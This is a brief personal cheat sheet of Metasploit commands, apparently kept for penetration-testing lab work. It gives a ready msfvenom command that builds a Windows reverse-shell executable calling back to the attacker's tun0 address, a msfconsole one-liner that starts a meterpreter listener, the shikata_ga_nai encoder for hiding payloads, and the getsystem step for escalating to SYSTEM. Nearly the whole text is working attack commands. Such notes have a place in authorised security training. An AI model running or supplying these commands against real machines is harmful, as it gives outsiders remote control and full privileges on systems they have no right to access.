# Metasploit commands

## Basics

basic msvenom reverse-shell payload:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=${PORT} -f exe -o shell
```

One-liner for setting up a listener
```
sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST tun0; set LPORT 6666; run"

```
## encoding

To see encoders available to you, use `msvenom -l encoders`.

Then, you can something like `-e x86/shikata_ga_nai` when creating the payload.

## Session handling

upgrade recent session to meterpreter session: `sessions -u -1`

## Windows Priv Esc

Using a meterpreter session of from payloads `windows/x64/shell_reverse_tcp` or `windows/shell/reverse_tcp`, you can do this script-kiddie move to privilege escalate:

```
meterpreter > use priv
```
(this might just say `[!] The "priv" extension has already been loaded.`)
```
getsystem
```
and meterpreter will do it's best to get you `NT AUTHORITY\SYSTEM`

